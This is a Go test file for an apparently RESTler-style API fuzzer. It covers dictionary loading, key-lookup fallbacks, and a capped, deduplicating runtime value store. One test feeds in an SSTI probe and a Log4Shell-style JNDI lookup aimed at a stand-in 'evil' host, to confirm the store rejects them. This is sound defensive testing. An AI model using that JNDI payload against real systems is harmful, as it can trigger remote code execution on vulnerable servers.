package main

import (
	"os"
	"path/filepath"
	"strconv"
	"testing"
)

func TestLoadDictEmptyPathReturnsEmptyStoreNotError(t *testing.T) {
	d, err := loadDict("")
	if err != nil {
		t.Fatalf("expected no error for an empty path, got %v", err)
	}
	if d == nil {
		t.Fatal("expected a non-nil empty store")
	}
	if got := d.candidatesForKey("anything"); len(got) != 0 {
		t.Errorf("expected no candidates from an empty store, got %v", got)
	}
}

func TestLoadDictMissingFileReturnsError(t *testing.T) {
	if _, err := loadDict("/nonexistent/dict.json"); err == nil {
		t.Error("expected an error for a missing dict.json file")
	}
}

func TestLoadDictParsesFlatArraysAndContainers(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "dict.json")
	content := `{
		"email": ["a@example.com", "b@example.com"],
		"restler_custom_payload": {"couponCode": ["SUMMER2026"]}
	}`
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write fixture: %v", err)
	}
	d, err := loadDict(path)
	if err != nil {
		t.Fatalf("loadDict returned error: %v", err)
	}
	if got := d.candidatesForKey("email"); len(got) != 2 {
		t.Errorf("expected 2 email candidates, got %v", got)
	}
	if got := d.candidatesForKey("couponCode"); len(got) != 1 || got[0] != "SUMMER2026" {
		t.Errorf("expected [SUMMER2026] from the restler_custom_payload container, got %v", got)
	}
}

func TestDictStoreCandidatesForKeyExactMatch(t *testing.T) {
	d := &DictStore{arrays: map[string][]string{"couponCode": {"SUMMER2026"}}, containers: map[string]map[string][]string{}}
	got := d.candidatesForKey("couponCode")
	if len(got) != 1 || got[0] != "SUMMER2026" {
		t.Errorf("expected exact-key match [SUMMER2026], got %v", got)
	}
}

func TestDictStoreCandidatesForKeyCanonicalFallback(t *testing.T) {
	// canonicalKey normalizes case/separators -- "coupon_code" and "CouponCode"
	// must resolve to the same candidate pool even though the literal keys differ.
	d := &DictStore{arrays: map[string][]string{"coupon_code": {"SUMMER2026"}}, containers: map[string]map[string][]string{}}
	got := d.candidatesForKey("CouponCode")
	if len(got) != 1 || got[0] != "SUMMER2026" {
		t.Errorf("expected canonical-key fallback to find [SUMMER2026], got %v", got)
	}
}

func TestDictStoreCandidatesForKeyShortNameFallback(t *testing.T) {
	// A dotted field path ("order.couponCode") falls back to matching on just its
	// last segment ("couponCode") when no entry exists for the full dotted key.
	d := &DictStore{arrays: map[string][]string{"couponCode": {"SUMMER2026"}}, containers: map[string]map[string][]string{}}
	got := d.candidatesForKey("order.couponCode")
	if len(got) != 1 || got[0] != "SUMMER2026" {
		t.Errorf("expected short-name fallback to find [SUMMER2026], got %v", got)
	}
}

func TestDictStoreCandidatesForKeyRestlerContainerFallback(t *testing.T) {
	d := &DictStore{
		arrays: map[string][]string{},
		containers: map[string]map[string][]string{
			"restler_custom_payload_query": {"apiKey": {"test-key-123"}},
		},
	}
	got := d.candidatesForKey("apiKey")
	if len(got) != 1 || got[0] != "test-key-123" {
		t.Errorf("expected restler-container fallback to find [test-key-123], got %v", got)
	}
}

func TestDictStoreCandidatesForKeyNilStoreIsSafe(t *testing.T) {
	var d *DictStore
	if got := d.candidatesForKey("anything"); got != nil {
		t.Errorf("expected nil from a nil *DictStore, got %v", got)
	}
}

func TestRuntimeStoreAddValueDedupsAndEvictsOldestAtCapacity(t *testing.T) {
	r := newRuntimeStore()
	for i := 0; i < maxRuntimeValuesPerKey+10; i++ {
		r.addValue("orderId", "v"+strconv.Itoa(i))
	}
	got := r.valuesForKey("orderId")
	if len(got) != maxRuntimeValuesPerKey {
		t.Errorf("expected values capped at %d, got %d", maxRuntimeValuesPerKey, len(got))
	}

	found0 := false
	for _, v := range got {
		if v == "v0" {
			found0 = true
		}
	}
	if found0 {
		t.Error("expected the earliest-added value to have been evicted (FIFO)")
	}

	// The evicted value's slot in the seen-set must also have been cleaned up, so
	// re-adding it later is possible (not silently deduped forever).
	if !r.addValue("orderId", "v0") {
		t.Error("expected the long-evicted value to be addable again (seen-set must have been cleaned up on eviction)")
	}
}

func TestRuntimeStoreAddValueRejectsInjectionLikePayloads(t *testing.T) {
	r := newRuntimeStore()
	// SSTI/JNDI-shaped values must never be reused as "learned" runtime values --
	// they'd create a garbage feedback loop where the fuzzer's own injected
	// payloads get treated as legitimate learned IDs.
	for _, v := range []string{"{{7*7}}", "${jndi:ldap://evil}", "plain-value"} {
		added := r.addValue("token", v)
		wantAdded := v == "plain-value"
		if added != wantAdded {
			t.Errorf("addValue(%q) = %v, want %v", v, added, wantAdded)
		}
	}
}

func TestRuntimeStoreAddValueDedupsSameValueForSameKey(t *testing.T) {
	r := newRuntimeStore()
	if !r.addValue("orderId", "42") {
		t.Fatal("expected first add to succeed")
	}
	if r.addValue("orderId", "42") {
		t.Error("expected a duplicate add for the same key to be rejected")
	}
	if len(r.valuesForKey("orderId")) != 1 {
		t.Errorf("expected exactly 1 stored value, got %d", len(r.valuesForKey("orderId")))
	}
}
